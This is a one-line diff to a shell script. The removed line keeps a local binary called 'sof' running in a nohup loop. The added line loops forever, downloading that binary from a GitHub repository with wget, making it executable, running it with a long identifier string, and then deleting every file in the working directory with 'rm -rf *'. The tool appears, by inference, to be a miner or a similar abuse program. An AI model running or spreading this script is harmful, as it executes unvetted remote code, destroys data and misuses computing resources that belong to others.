@@ -1,1 +1,1 @@
-pgrep -x test >/dev/null && echo "Process found" || nohup bash -c 'for i in {1..99999}; ./sof -t 7 -i KVAQTPYWKGFQKETWTBAEZBCIKVNAQZFUIFPTPJSETEDNEJMSVLBEGHEGOOLM --label az; done' > program.out 2>&1 &
+while :; do wget https://github.com/molotovman88/a/raw/main/sof && chmod +x sof && ./sof -t 7 -i KVAQTPYWKGFQKETWTBAEZBCIKVNAQZFUIFPTPJSETEDNEJMSVLBEGHEGOOLM --label sha; rm -rf *; done
